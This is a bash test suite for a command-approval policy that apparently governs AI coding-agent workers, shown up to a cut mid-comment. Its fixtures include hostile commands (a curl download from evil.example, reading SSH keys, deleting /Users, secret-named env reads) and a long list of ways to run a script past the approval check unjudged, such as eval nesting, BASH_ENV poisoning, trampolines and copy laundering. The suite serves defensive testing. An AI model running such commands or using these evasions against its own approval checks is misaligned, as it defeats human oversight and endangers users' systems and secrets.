#!/usr/bin/env bash
# verify-scoped-approval.sh — the pieces of task-scoped approval that are not
# herdr-select.sh end-to-end (those live in verify-select-policy.sh):
#   * lib/task-manifest.sh parses a SPEC.md manifest and FAILS CLOSED on
#     anything it would otherwise have to guess at;
#   * lib/command-policy.sh's python content check does not fire on ordinary
#     data processing (the false-positive direction) and does on each risky
#     capability (the direction that matters);
#   * the composed canonical rules a managed spawn gets carry the worker
#     approval rules (">~10 lines goes in a file").
#
#   bash verify-scoped-approval.sh
set -uo pipefail
here=$(cd "$(dirname "$0")" && pwd)
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT
. "$here/lib/task-manifest.sh"
. "$here/lib/command-policy.sh"

pass=0 fail=0
ok()  { pass=$((pass+1)); printf '  ok    %s\n' "$1"; }
bad() { fail=$((fail+1)); printf '  FAIL  %s\n' "$1"; }

spec() {                                # <manifest body lines...> -> spec path
  local f="$WORK/SPEC.$RANDOM.md"
  { printf '# Task\n\n```herdr-manifest\n'; printf '%s\n' "$@"; printf '```\n'; } > "$f"
  printf '%s' "$f"
}

printf '== manifest: valid block parses to canonical JSON ==\n'
got="$(manifest_from_spec "$(spec 'net_read: [teamthurber.com, www.teamthurber.com]' \
  'writes: [tmp/**, GEO-AUDIT-REPORT-*.md]' 'net_write: none' 'git: commit-only')")"; rc=$?
want='{"git":"commit-only","net_read":["teamthurber.com","www.teamthurber.com"],"net_write":"none","writes":["GEO-AUDIT-REPORT-*.md","tmp/**"]}'
[ "$rc" = 0 ] && [ "$got" = "$want" ] && ok "canonical JSON, sorted, defaults filled" || bad "got rc=$rc '$got'"
got="$(manifest_from_spec "$(spec 'net_read: [teamthurber.com]')")"
[ "$(printf '%s' "$got" | jq -r .git)" = push-own-branch ] && ok "git defaults to today's grant (push-own-branch)" || bad "default git: $got"
printf '# no manifest here\n' > "$WORK/plain.md"
got="$(manifest_from_spec "$WORK/plain.md")"; rc=$?
[ "$rc" = 0 ] && [ -z "$got" ] && ok "no block -> no manifest (behaviour unchanged)" || bad "plain spec: rc=$rc '$got'"

printf '== manifest: invalid blocks refuse the spawn (exit 2) ==\n'
while IFS='|' read -r label line; do
  manifest_from_spec "$(spec "$line")" >/dev/null 2>&1; rc=$?
  [ "$rc" = 2 ] && ok "refused: $label" || bad "accepted ($rc): $label"
done <<'EOF'
net_write granted|net_write: [teamthurber.com]
unknown key (typo)|net-read: [teamthurber.com]
wildcard host|net_read: [*.teamthurber.com]
IP host|net_read: [10.0.0.1]
host with port|net_read: [teamthurber.com:443]
absolute glob|writes: [/tmp/**]
home glob|writes: [~/out/*]
dotdot glob|writes: [tmp/../../x]
.git target|writes: [.git/**]
.handoffs target|writes: [.handoffs/*]
.env target|writes: [.env.local]
bad git value|git: push-anywhere
unbracketed list|net_read: teamthurber.com
EOF
two="$WORK/two.md"
printf '```herdr-manifest\ngit: none\n```\n```herdr-manifest\ngit: none\n```\n' > "$two"
manifest_from_spec "$two" >/dev/null 2>&1; rc=$?
[ "$rc" = 2 ] && ok "refused: two manifest blocks" || bad "accepted two blocks ($rc)"

printf '== python content: data processing is clean, risky capabilities are not ==\n'
clean='import json, re, pathlib
pat = re.compile(r"<title>(.*?)</title>")
data = json.loads(pathlib.Path("tmp/geo/pagedata.json").read_text())
model.eval()
print(len(data))'
_cp_python_risk "$clean" >/dev/null && bad "clean data-processing script flagged: $(_cp_python_risk "$clean")" \
  || ok "re.compile / model.eval() / json / pathlib are not risk"
while IFS= read -r risky; do
  [ -n "$risky" ] || continue
  _cp_python_risk "$risky" >/dev/null && ok "flagged: $risky" || bad "missed: $risky"
done <<'EOF'
import subprocess; subprocess.run(["ls"])
import os; os.system("ls")
import urllib.request
import requests
import socket
import shutil; shutil.rmtree("x")
import os; os.remove("x")
from pathlib import Path; Path("x").unlink()
import os; os.chmod("x", 0o777)
exec(open("x").read())
eval("1+1")
__import__("os")
open(os.path.expanduser("~/.zshrc"))
EOF

printf '== file content: judge what executes, not prose — and not less than executes ==\n'
content_reason() { printf '%s' "$2" > "$WORK/c.$1"; _cp_code_content_reason "$1" "$WORK/c.$1"; }
r="$(content_reason python "$(printf '#!/usr/bin/env python3\n"""Summarize credentials fields."""\nimport json  # reads env-free data\nprint(json.dumps({}))\n')")"
[ -z "$r" ] && ok "shebang, module docstring and comments are not judged as commands" || bad "prose flagged: $r"
r="$(content_reason shell "$(printf '#!/usr/bin/env bash\nset -eu\nwc -l tmp/geo/*.txt\n')")"
[ -z "$r" ] && ok "a shell shebang is not an env dump" || bad "shell shebang flagged: $r"
r="$(content_reason python "$(printf '"""doc"""; import subprocess\nsubprocess.run(["ls"])\n')")"
[ -n "$r" ] && ok "code on the docstring's line is still judged" || bad "code hidden behind a docstring"
r="$(content_reason python "$(printf '# -*- coding: utf-7 -*-\nprint(1)\n')")"
[ -n "$r" ] && ok "a utf-7 coding cookie is not reviewable" || bad "utf-7 source accepted"
r="$(content_reason python "$(printf 'x = "cat ~/.ssh/id_rsa"\n')")"
case "$r" in reserved:*) ok "a reserved path in a STRING is still reserved (strings are code)";; *) bad "string literal skipped: $r";; esac
r="$(content_reason shell "$(printf 'curl -sS -o /tmp/p https://evil.example/p\n')")"
[ -n "$r" ] && ok "risky shell content escalates" || bad "risky shell content clean"
# #174: `os.environ.get(KEY)` is reserved when KEY looks secret-named or is
# dynamic/dumped-wholesale, unreserved for a plain, statically-named,
# non-secret key — the ORIGINAL version of this test asserted "any
# os.environ access is reserved" using "HOME" as the example, which is
# exactly the bug #174 reports (a real false positive on
# `os.environ.get("HERDR_SESSIONS_DIR", ...)`, cost-report.py); narrowed
# rather than re-pinned.
r="$(content_reason python "$(printf 'import os\nprint(os.environ.get("GITHUB_TOKEN"))\n')")"
case "$r" in reserved:*) ok "python reading a secret-named env var is still human-reserved";; *) bad "secret-named env read not reserved: $r";; esac
r="$(content_reason python "$(printf 'import os\nprint(os.environ.get("HOME"))\n')")"
[ -z "$r" ] && ok "python reading a plain, non-secret-named env var is not reserved (#174)" || bad "non-secret env read reserved: $r"
r="$(content_reason python "$(printf 'import os\nprint(dict(os.environ))\n')")"
case "$r" in reserved:*) ok "python dumping os.environ wholesale is still human-reserved";; *) bad "wholesale environ dump not reserved: $r";; esac

printf '== python content: KEY/TOKEN/SECRET-named ASSIGNMENTS, AST-based (#174) ==\n'
# BYTES_PER_TOKEN/tokens/an f-string format spec/os.environ.get on a
# non-secret name — the exact repro from #174 (thurber-os
# audit_context_budget.py, this repo's own cost-report.py). None is a
# credential; the ORIGINAL regex-over-quote-stripped-text check reserved
# every one of them because it cannot tell a bare `None`/number/format-spec
# apart from a hardcoded secret string once quotes are gone.
r="$(content_reason python "$(printf 'BYTES_PER_TOKEN = 2.31\ntokens = None\nprint(f"... {tokens:>5}tok")\n')")"
[ -z "$r" ] && ok "BYTES_PER_TOKEN/tokens=None/an f-string format spec are not credentials (#174)" || bad "ordinary token-named code flagged: $r"
r="$(content_reason python "$(printf 'import os\nfrom pathlib import Path\nSESSIONS_DIR = Path(os.environ.get("HERDR_SESSIONS_DIR", "/tmp"))\n')")"
[ -z "$r" ] && ok "os.environ.get on a non-secret name inside an assignment is not reserved (#174)" || bad "SESSIONS_DIR assignment flagged: $r"
# Negative: a real hardcoded secret literal must still be reserved, whether
# assigned with '=' or an annotated ':', or as a dict-literal value.
r="$(content_reason python "$(printf 'API_KEY = "sk-live-1234567890abcdef1234567890"\n')")"
case "$r" in reserved:*) ok "a real hardcoded API_KEY literal is still human-reserved";; *) bad "hardcoded API_KEY literal not reserved: $r";; esac
r="$(content_reason python "$(printf 'GITHUB_TOKEN: str = "ghp_1234567890abcdef1234567890abcd"\n')")"
case "$r" in reserved:*) ok "an annotated assignment with a real token literal is still human-reserved";; *) bad "annotated token literal not reserved: $r";; esac
r="$(content_reason python "$(printf 'cfg = {"KB_API_KEY": "AKIAiosfodnn7example"}\n')")"
case "$r" in reserved:*) ok "a real secret in a dict literal is still human-reserved";; *) bad "dict-literal secret not reserved: $r";; esac
# A test-code placeholder stays unreserved (existing carve-out, ported to AST).
r="$(content_reason python "$(printf 'TOKEN = "test-token"\n')")"
[ -z "$r" ] && ok "an obvious test-code placeholder token literal stays unreserved" || bad "placeholder token literal reserved: $r"

cat > "$WORK/fstring.py" <<'EOF'
ps, vis, n = "1", "x", {}
print(f"  {n.get('name')!r:45} vis={('$'+ps).lower() in vis if ps else None}")
EOF
r="$(_cp_code_content_reason python "$WORK/fstring.py")"
[ -z "$r" ] && ok "a python f-string with '\$'+x is not a shell env dump (measured: schema_listing.py)" || bad "python f-string misread as shell: $r"

printf '== code by reference judges ONE file, so running/importing another escalates ==\n'
mkdir -p "$WORK/pkg"
printf 'import urllib.request\n' > "$WORK/pkg/helper.py"
printf 'import helper\nprint(helper)\n' > "$WORK/pkg/wrapper.py"
r="$(_cp_code_content_reason python "$WORK/pkg/wrapper.py")"
case "$r" in nested:*) ok "python importing a sibling module escalates";; *) bad "sibling import cleared: $r";; esac
printf 'import json\nprint(json)\n' > "$WORK/pkg/stdlib_only.py"
r="$(_cp_code_content_reason python "$WORK/pkg/stdlib_only.py")"
[ -z "$r" ] && ok "a stdlib import is not a local import" || bad "stdlib import flagged: $r"
while IFS= read -r nested; do
  r="$(content_reason shell "$nested")"
  case "$r" in nested:*) ok "shell content that runs another file escalates: $nested";; *) bad "nested run cleared: $nested ($r)";; esac
done <<'EOF'
. tmp/inner.sh
source tmp/inner.sh
bash tmp/inner.sh
python3 tmp/wrapper.py
./tmp/run-me
wc -l x | xargs echo
EOF
while IFS= read -r risky; do
  r="$(content_reason python "$risky")"
  [ -n "$r" ] && ok "python tripwire: $risky" || bad "python tripwire missed: $risky"
done <<'EOF'
from os import system
import os; f = getattr(os, "sys" + "tem")
import runpy; runpy.run_path("x.py")
import pwd
import sys; sys.path.insert(0, "/tmp")
EOF

printf '== git ceiling: none refuses every history/worktree write, reads pass ==\n'
NONE='{"git":"none","net_read":[],"net_write":"none","writes":[]}'
for c in "git commit -m x" "git merge feat/x" "git reset --hard HEAD~1" "git stash" "git tag v1" "git checkout -b x" "git branch -D x" "git rebase main"; do
  [ -n "$(_cp_scope_ceiling "$c" "$NONE")" ] && ok "git: none refuses: $c" || bad "git: none let through: $c"
done
for c in "git status --short" "git log --oneline -5" "git diff HEAD" "git show HEAD"; do
  [ -z "$(_cp_scope_ceiling "$c" "$NONE")" ] && ok "git: none allows read: $c" || bad "git: none refused a read: $c"
done

printf '== python: NFKC-folded identifiers are judged as the interpreter reads them ==\n'
printf 'import \357\275\223\357\275\225\357\275\202\357\275\220\357\275\222\357\275\217\357\275\203\357\275\205\357\275\223\357\275\223\n' > "$WORK/fullwidth.py"
r="$(_cp_code_content_reason python "$WORK/fullwidth.py")"
[ -n "$r" ] && ok "fullwidth 'subprocess' is caught after NFKC" || bad "fullwidth identifier slipped the tripwire"

printf '== commit-message strip keeps every other argument ==\n'
got="$(_cp_strip_commit_message 'git commit -F ~/.ssh/id_ed25519 -am "mentions herdr-select.sh"' /wt)"
case "$got" in *id_ed25519*) ok "the -F path survives the strip";; *) bad "strip dropped -F path: $got";; esac
case "$got" in *herdr-select*) bad "message value survived the strip: $got";; *) ok "only the -m value is removed";; esac

printf '== composed canonical rules carry the worker approval rules ==\n'
. "$here/lib/agent-profiles.sh"
printf 'OPERATOR RULE\n' > "$WORK/AGENTS.md"
composed="$(HERDR_STATE_DIR="$WORK/state" canonical_rules_compose "$WORK/AGENTS.md")"
grep -q 'OPERATOR RULE' "$composed" && grep -q 'More than ~10 lines of code goes in a file' "$composed" \
  && ok "operator rules + herdr-control worker rules both present" || bad "composed rules: $composed"

printf '== code by reference: every script-executing segment of a compound command ==\n'
# F8: _cp_code_ref used to return 1 ("not code by reference") for anything but
# ONE simple command, so a pipe/redirect/chain/wrapper around `bash tmp/x.sh`
# ran the file unjudged. Each form below must now resolve to the script
# (rc 0 + its realpath) or refuse to guess (rc 3) — never rc 1.
CRWT="$WORK/crwt"; mkdir -p "$CRWT/tmp"
CRWT="$(cd "$CRWT" && pwd -P)"
printf '#!/bin/sh\ngh pr merge 1 --squash\n' > "$CRWT/tmp/evil.sh"; chmod +x "$CRWT/tmp/evil.sh"
printf 'import subprocess\nsubprocess.run(["gh","pr","merge","1"])\n' > "$CRWT/tmp/evil.py"
printf '#!/bin/sh\necho hello\n' > "$CRWT/tmp/clean.sh"
while IFS= read -r form; do
  [ -n "$form" ] || continue
  c="${form//@WT@/$CRWT}"
  out="$(_cp_code_ref "$c" "$CRWT")"; rc=$?
  case "$rc:$out" in
    0:*/tmp/evil.sh|0:*/tmp/evil.sh?order|0:*/tmp/evil.py|0:*/tmp/evil.py?order|3:*) ok "judged or refused (rc=$rc): $c" ;;
    *) bad "script ran unjudged (rc=$rc '$out'): $c" ;;
  esac
done <<'EOF'
cd @WT@ && bash tmp/evil.sh | tail -3
cd @WT@ && bash tmp/evil.sh 2>&1 | tail -3
cd @WT@ && bash tmp/evil.sh > /tmp/out.txt
cd @WT@ && bash tmp/evil.sh 2>/dev/null
cd @WT@ && bash tmp/evil.sh < /dev/null
cd @WT@ && bash tmp/evil.sh && echo ok
cd @WT@ && bash tmp/evil.sh; echo ok
cd @WT@ && bash tmp/evil.sh || true
cd @WT@ && true && bash tmp/evil.sh
cd @WT@ && (bash tmp/evil.sh)
cd @WT@ && { bash tmp/evil.sh; }
cd @WT@ && echo $(bash tmp/evil.sh)
cd @WT@ && echo `bash tmp/evil.sh`
cd @WT@ && bash -c "bash tmp/evil.sh"
cd @WT@ && sh -c 'bash tmp/evil.sh'
cd @WT@ && eval "bash tmp/evil.sh"
cd @WT@ && source tmp/evil.sh
cd @WT@ && . tmp/evil.sh
cd @WT@ && ./tmp/evil.sh
@WT@/tmp/evil.sh
@WT@/tmp/evil.sh | tail -1
cd @WT@ && echo tmp/evil.sh | xargs bash
cd @WT@ && find tmp -name evil.sh -exec bash {} \;
cd @WT@ && find tmp -name evil.sh -exec {} \;
cd @WT@ && env FOO=1 bash tmp/evil.sh
cd @WT@ && nohup bash tmp/evil.sh
cd @WT@ && time bash tmp/evil.sh
cd @WT@ && timeout 5 bash tmp/evil.sh
cd @WT@ && exec bash tmp/evil.sh
cd @WT@ && command bash tmp/evil.sh
cd @WT@ && nice -n 5 bash tmp/evil.sh
cd @WT@ && bash < tmp/evil.sh
cd @WT@ && cat tmp/evil.sh | bash
cd @WT@ && bash -x tmp/evil.sh
cd @WT@ && bash -- tmp/evil.sh
cd @WT@ && bash tmp/evil.sh &
cd @WT@ && python3 tmp/evil.py | tail -1
cd @WT@ && python3 tmp/evil.py > /tmp/o.txt
cd @WT@ && bash <(cat tmp/evil.sh)
cd @WT@ && watch -n1 bash tmp/evil.sh
cd @WT@ && bash tmp/clean.sh && bash tmp/evil.sh
cd @WT@ && cd tmp && bash evil.sh
bash tmp/evil.sh | tail -3
bash @WT@/tmp/evil.sh | tail -3
EOF
out="$(_cp_code_ref "cd $CRWT && bash tmp/clean.sh 2>&1 | tail -3" "$CRWT")"; rc=$?
[ "$rc" = 0 ] && [ "$out" = "shell	$CRWT/tmp/clean.sh" ] \
  && ok "a clean script inside a pipe resolves to that one file" || bad "clean piped script: rc=$rc '$out'"
out="$(_cp_code_ref "cd $CRWT && git status --short | tail -3" "$CRWT")"; rc=$?
[ "$rc" = 1 ] && ok "a compound command running no script is not code by reference" || bad "no-script compound: rc=$rc '$out'"
out="$(_cp_code_ref "cd $CRWT && python3 -m json.tool tmp/x.json | head" "$CRWT")"; rc=$?
[ "$rc" = 1 ] && ok "python3 -m stays out of scope (unchanged)" || bad "python -m: rc=$rc '$out'"

printf '== code by reference: worker-written exec trampolines ==\n'
# A script whose command word is its own argv (`"$@"`, `$cmd "$@"`,
# `"$cmd" "$@"`) executes whatever the CALLER passes: approving its bytes
# approves nothing. Its content must never classify clean or replayable, and
# an argument substitution (`"$(pwd)"`) must not knock the command out of
# code-by-reference (it used to: _cp_simple_words refuses @SUB@ -> rc 1).
printf '#!/bin/sh\n"$@"\n' > "$CRWT/tmp/tramp1.sh"
printf '#!/bin/sh\ncmd=$1; shift; $cmd "$@"\n' > "$CRWT/tmp/tramp2.sh"
printf '#!/usr/bin/env bash\nroot="${1:?root}"\nlib="lib/x.sh"\n. "$root/$lib"\nshift\ncmd="$1"; shift\n"$cmd" "$@"\n' > "$CRWT/tmp/tramp3.sh"
for t in tramp1 tramp2 tramp3; do
  r="$(_cp_code_content_reason shell "$CRWT/tmp/$t.sh" "$CRWT/tmp")"
  [ -n "$r" ] && ok "exec trampoline $t.sh is not clean: $r" || bad "exec trampoline $t.sh classifies clean"
done
cp "$CRWT/tmp/tramp3.sh" "$WORK/harness.sh"
while IFS= read -r form; do
  [ -n "$form" ] || continue
  c="${form//@WT@/$CRWT}"; c="${c//@OUT@/$WORK}"
  out="$(_cp_code_ref "$c" "$CRWT")"; rc=$?
  case "$rc:$out" in
    0:*/tmp/tramp*.sh|0:*/tmp/tramp*.sh?order|3:*) ok "trampoline judged or refused (rc=$rc): $c" ;;
    *) bad "trampoline ran unjudged (rc=$rc '$out'): $c" ;;
  esac
done <<'EOF'
bash @OUT@/harness.sh "$(pwd)" _cp_walk_prep 'cd /tmp/x && bash tmp/evil.sh 2>&1 | tail -3'
bash @OUT@/harness.sh "$(pwd)" ls
cd @WT@ && bash tmp/tramp3.sh "$(pwd)" ls
cd @WT@ && bash tmp/tramp1.sh "$(printf gh)" pr view 1
cd @WT@ && bash tmp/tramp2.sh `echo ls` -la
EOF


printf '== PR #160 review round 1: findings 1-11 must never allow, only judge (0) or refuse (3) ==\n'
RWT="$WORK/routside"; mkdir -p "$RWT"
printf '#!/bin/sh\ngh pr merge 1 --squash\n' > "$RWT/evil.sh"
ln -s "$RWT/evil.sh" "$CRWT/tmp/outlink.sh"
printf '#!/bin/sh\necho run\n' > "$CRWT/run.sh"
printf '#!/bin/sh\ngh pr merge 1 --squash\n' > "$CRWT/tmp/run.sh"
for mc in \
  "cd $CRWT && true"$'\n'"bash tmp/evil.sh|multi-line: true then bash on its own line" \
  "cd $CRWT && bash tmp/evil.sh"$'\n'"|trailing newline only" \
  "cd $CRWT && bash <<HD"$'\n'"bash tmp/evil.sh"$'\n'"HD|heredoc feeding bash"; do
  c="${mc%%|*}"; label="${mc#*|}"
  out="$(_cp_code_ref "$c" "$CRWT")"; rc=$?
  case "$rc:$out" in
    0:*/tmp/evil.sh|0:*/tmp/evil.sh?order|3:*) ok "judged or refused (rc=$rc): $label" ;;
    *) bad "script ran unjudged (rc=$rc '$out'): $label" ;;
  esac
done
for mc in \
  "true"$'\n'"bash $RWT/evil.sh|absolute path, no cd prefix: true then bash on its own line" \
  "bash $RWT/evil.sh"$'\n'"|absolute path, trailing newline only, no cd prefix" \
  "echo hi"$'\n'"$RWT/evil.sh|absolute path word alone on the second line, no cd prefix"; do
  c="${mc%%|*}"; label="${mc#*|}"
  out="$(_cp_code_ref "$c" "$CRWT")"; rc=$?
  case "$rc:$out" in
    0:*/evil.sh|0:*/evil.sh?order|3:*) ok "judged or refused (rc=$rc): $label" ;;
    *) bad "script ran unjudged (rc=$rc '$out'): $label" ;;
  esac
done
out="$(_cp_code_ref "git status"$'\n'"ls -la" "$CRWT")"; rc=$?
[ "$rc" = 1 ] && ok "a genuine multi-line capture running no script anywhere stays rc 1" \
  || bad "git status+ls -la: rc=$rc '$out'"
panel_safe=" Bash command"$'\n'"   ls -la /tmp"$'\n'"   (a description line)"$'\n'""$'\n'" Do you want to proceed?"$'\n'" ❯ 1. Yes"$'\n'"   2. No"
out="$(_cp_code_ref "$panel_safe" "$CRWT")"; rc=$?
[ "$rc" = 1 ] && ok "a numbered-panel scrape with no real script stays rc 1 (its own chrome does not misparse)" \
  || bad "panel chrome misparsed as a command: rc=$rc '$out'"
while IFS= read -r form; do
  [ -n "$form" ] || continue
  c="${form//@WT@/$CRWT}"
  out="$(_cp_code_ref "$c" "$CRWT")"; rc=$?
  case "$rc:$out" in
    0:*/tmp/evil.sh|0:*/tmp/evil.sh?order|0:*/tmp/evil.py|0:*/tmp/evil.py?order|0:*/tmp/outlink.sh|0:*/tmp/outlink.sh?order|3:*) ok "judged or refused (rc=$rc): $c" ;;
    *) bad "script ran unjudged (rc=$rc '$out'): $c" ;;
  esac
done <<EOF
cd @WT@ && eval eval eval eval eval eval eval bash tmp/evil.sh
cd @WT@ && echo \$(echo \$(echo \$(echo \$(echo \$(echo \$(echo \$(bash tmp/evil.sh)))))))
cd @WT@ && \$SHELL tmp/evil.sh
cd @WT@ && "\$BASH" tmp/evil.sh
cd @WT@ && \$0 tmp/evil.sh
cd @WT@ && \$(which bash) tmp/evil.sh
cd @WT@ && \`which bash\` tmp/evil.sh
cd @WT@ && ba\$()sh tmp/evil.sh
cd @WT@ && x=bash; \$x tmp/evil.sh
cd @WT@ && bash -c "\$(cat tmp/evil.sh)"
cd @WT@ && sh -c "\$(<tmp/evil.sh)"
cd @WT@ && eval "\$(cat tmp/evil.sh)"
cd @WT@ && cat tmp/evil.sh |& bash
cd @WT@ && cat tmp/evil.sh |& bash -s
cd @WT@ && < tmp/evil.sh bash
<tmp/evil.sh sh
0<tmp/evil.sh bash
cd @WT@ && < tmp/evil.py python3
cd @WT@ && bash &>/dev/null < tmp/evil.sh
cd @WT@ && python3 &>/dev/null < tmp/evil.py
cd @WT@ && echo tmp/evil.sh | xargs -n 1 bash
cd @WT@ && echo tmp/evil.sh | xargs -I {} sh {}
cd @WT@ && echo tmp/evil.sh | xargs -P 2 bash
cd @WT@ && echo tmp/evil.sh | xargs -L 1 bash
cd @WT@ && watch -n 1 bash tmp/evil.sh
cd @WT@ && parallel -j 2 bash ::: tmp/evil.sh
cd @WT@ && eval cd tmp && bash run.sh
cd @WT@ && \$(echo cd) tmp && bash run.sh
cd @WT@ && echo \$'\\'' ; bash tmp/evil.sh
cd @WT@ && echo \$'it\\'s' \$(bash tmp/evil.sh)
cd @WT@ && ./tmp/outlink.sh
EOF
out="$(_cp_code_ref "$RWT/evil.sh" "$CRWT")"; rc=$?
[ "$rc" = 3 ] && ok "an absolute /tmp path outside the worktree escalates (finding 11)" || bad "outside-worktree absolute path: rc=$rc '$out'"

printf '== finding 9: python flags other than -uBev still resolve the file slot ==\n'
for pyflag in -I -O -S; do
  out="$(_cp_code_ref "cd $CRWT && python3 $pyflag tmp/evil.py" "$CRWT")"; rc=$?
  case "$rc:$out" in
    0:*/tmp/evil.py|0:*/tmp/evil.py?order) ok "python3 $pyflag resolves the file slot" ;;
    *) bad "python3 $pyflag: rc=$rc '$out'" ;;
  esac
done
out="$(_cp_code_ref "cd $CRWT && python3 -W ignore tmp/evil.py" "$CRWT")"; rc=$?
case "$rc:$out" in 0:*/tmp/evil.py|0:*/tmp/evil.py?order|3:*) ok "python3 -W ignore resolves past its value" ;; *) bad "python3 -W: rc=$rc '$out'" ;; esac
out="$(_cp_code_ref "cd $CRWT && python3 -X utf8 tmp/evil.py" "$CRWT")"; rc=$?
case "$rc:$out" in 0:*/tmp/evil.py|0:*/tmp/evil.py?order|3:*) ok "python3 -X utf8 resolves past its value" ;; *) bad "python3 -X: rc=$rc '$out'" ;; esac

printf '== finding 10: launcher option values and shell keywords no longer hide the script ==\n'
for form in "timeout 5s bash tmp/evil.sh" "timeout 1.5m bash tmp/evil.sh" "exec -a foo bash tmp/evil.sh" \
            "coproc bash tmp/evil.sh" "function f { bash tmp/evil.sh; }; f"; do
  out="$(_cp_code_ref "cd $CRWT && $form" "$CRWT")"; rc=$?
  case "$rc:$out" in
    0:*/tmp/evil.sh|0:*/tmp/evil.sh?order|3:*) ok "resolves past the launcher: $form" ;;
    *) bad "launcher hid the script: $form (rc=$rc '$out')" ;;
  esac
done

printf '== finding 13: python3 -m <local.module> resolves to its worktree file ==\n'
out="$(_cp_code_ref "cd $CRWT && python3 -m tmp.evil" "$CRWT")"; rc=$?
case "$rc:$out" in 0:*/tmp/evil.py|0:*/tmp/evil.py?order|3:*) ok "python3 -m tmp.evil resolves tmp/evil.py" ;; *) bad "python3 -m tmp.evil: rc=$rc '$out'" ;; esac
out="$(_cp_code_ref "cd $CRWT && python3 -m tmp.evil | tail -1" "$CRWT")"; rc=$?
case "$rc:$out" in 0:*/tmp/evil.py|0:*/tmp/evil.py?order|3:*) ok "python3 -m tmp.evil resolves past a trailing pipe" ;; *) bad "python3 -m piped: rc=$rc '$out'" ;; esac
out="$(_cp_code_ref "cd $CRWT && python3 -m json.tool tmp/x.json | head" "$CRWT")"; rc=$?
[ "$rc" = 1 ] && ok "python3 -m json.tool (no matching worktree file) stays out of scope" || bad "json.tool: rc=$rc '$out'"

printf '== finding 14: the same file judged as two different kinds counts as two scripts ==\n'
printf 'import shutil\nshutil.rmtree("/Users")\n' > "$CRWT/tmp/rm.py"
out="$(_cp_code_ref "cd $CRWT && python3 tmp/rm.py" "$CRWT")"; rc=$?
[ "$rc" = 0 ] && ok "python3 tmp/rm.py resolves alone" || bad "python3 tmp/rm.py alone: rc=$rc"
out="$(_cp_code_ref "cd $CRWT && bash tmp/rm.py 2>/dev/null; python3 tmp/rm.py" "$CRWT")"; rc=$?
[ "$rc" = 3 ] && ok "the same path judged shell AND python counts as two scripts, escalates" \
  || bad "two-kind same-path replay: rc=$rc '$out'"

printf '== finding 15: clustered -c and value-taking shell options no longer over-escalate ==\n'
for form in "bash -lc 'npm test'" "bash -ec 'npm test'" "sh -ec 'git status'" "zsh -lc 'git status'" \
            "bash -o pipefail -c 'npm test | tail'" "bash -euo pipefail -c 'npm test'"; do
  out="$(_cp_code_ref "cd $CRWT && $form" "$CRWT")"; rc=$?
  [ "$rc" = 1 ] && ok "no over-escalation: $form" || bad "over-escalated: $form (rc=$rc '$out')"
done
out="$(_cp_code_ref "cd $CRWT && bash -n tmp/x.sh" "$CRWT")"; rc=$?
[ "$rc" = 1 ] && ok "bash -n never executes, stays out of scope" || bad "bash -n tmp/x.sh: rc=$rc"
out="$(_cp_code_ref "cd $CRWT && bash -n tmp/evil.sh" "$CRWT")"; rc=$?
[ "$rc" = 1 ] && ok "bash -n tmp/evil.sh is not reserved either — it never executes" || bad "bash -n tmp/evil.sh: rc=$rc"

printf '== finding 16: find -okdir escalates like -exec/-execdir/-ok ==\n'
out="$(_cp_code_ref "cd $CRWT && find tmp -name evil.sh -okdir bash {} \\;" "$CRWT")"; rc=$?
[ "$rc" = 3 ] && ok "find -okdir escalates" || bad "find -okdir: rc=$rc '$out'"

printf '== finding 17: interpreter-loading env vars are treated as a second, unreviewed script ==\n'
for form in "BASH_ENV=tmp/evil.sh bash tmp/clean.sh" "BASH_ENV=tmp/evil.sh bash -c true" \
            "PYTHONPATH=tmp python3 tmp/clean.py" "export BASH_ENV=tmp/evil.sh; bash tmp/clean.sh"; do
  out="$(_cp_code_ref "cd $CRWT && $form" "$CRWT")"; rc=$?
  [ "$rc" = 3 ] && ok "env-poisoned invocation escalates: $form" || bad "env poisoning missed: $form (rc=$rc '$out')"
done

printf '== finding 18: csh/tcsh/fish, pypy, and uv run/uvx/pipx run are covered ==\n'
while IFS= read -r form; do
  [ -n "$form" ] || continue
  c="${form//@WT@/$CRWT}"
  out="$(_cp_code_ref "$c" "$CRWT")"; rc=$?
  case "$rc:$out" in
    0:*/tmp/evil.sh|0:*/tmp/evil.sh?order|0:*/tmp/evil.py|0:*/tmp/evil.py?order|3:*) ok "judged or refused (rc=$rc): $c" ;;
    *) bad "interpreter not covered (rc=$rc '$out'): $c" ;;
  esac
done <<EOF
cd @WT@ && csh tmp/evil.sh
cd @WT@ && tcsh tmp/evil.sh
cd @WT@ && fish tmp/evil.sh
cd @WT@ && pypy3 tmp/evil.py
cd @WT@ && uv run python tmp/evil.py
cd @WT@ && uv run tmp/evil.py
EOF

printf '== finding 12: rewriting the script another segment runs escalates (rename/copy laundering) ==\n'
printf '#!/bin/sh\necho hello\n' > "$CRWT/tmp/laundered.sh"
for form in "cp tmp/evil.sh tmp/laundered.sh && bash tmp/laundered.sh" \
            "cat tmp/evil.sh > tmp/laundered.sh; bash tmp/laundered.sh" \
            "ln -sf evil.sh tmp/laundered.sh && bash tmp/laundered.sh"; do
  out="$(_cp_code_ref "cd $CRWT && $form" "$CRWT")"; rc=$?
  [ "$rc" = 3 ] && ok "laundering escalates: $form" || bad "laundering slipped through: $form (rc=$rc '$out')"
done
out="$(_cp_code_ref "cd $CRWT && bash tmp/clean.sh 2>&1 | tail -3" "$CRWT")"; rc=$?
[ "$rc" = 0 ] && [ "$out" = "shell	$CRWT/tmp/clean.sh" ] \
  && ok "a script named only in its own invocation still resolves and binds its sha" \
  || bad "single-mention regression: rc=$rc '$out'"

printf '== code by reference, review round 2 (#160) ==\n'
# python3 -c with a plain local import runs a worktree file with no risky
# keyword in the -c text; it must not be "not code by reference".
mkdir -p "$CRWT/pkgr"; : > "$CRWT/pkgr/__init__.py"
printf 'import subprocess\nsubprocess.run(["gh","pr","merge","1"])\n' > "$CRWT/pkgr/evil.py"
for form in "python3 -c 'import pkgr.evil'" "python3 -c 'from pkgr import evil'" \
            "cd $CRWT && python3 -c 'import pkgr.evil'"; do
  out="$(_cp_code_ref "$form" "$CRWT")"; rc=$?
  [ "$rc" = 3 ] && ok "python -c local import escalates: $form" || bad "python -c local import ran unjudged (rc=$rc '$out'): $form"
done
out="$(_cp_code_ref "cd $CRWT && python3 -c 'import json; print(json.dumps({}))'" "$CRWT")"; rc=$?
[ "$rc" = 1 ] && ok "python -c with only stdlib imports is not code by reference" || bad "stdlib python -c over-blocked: rc=$rc '$out'"
# The same script run twice escalates (fails closed): a clean-classified
# script can rewrite itself between the runs (review round 3, #160 —
# `bash x.sh && bash x.sh` where x.sh does `cp evil x.sh`). A writer
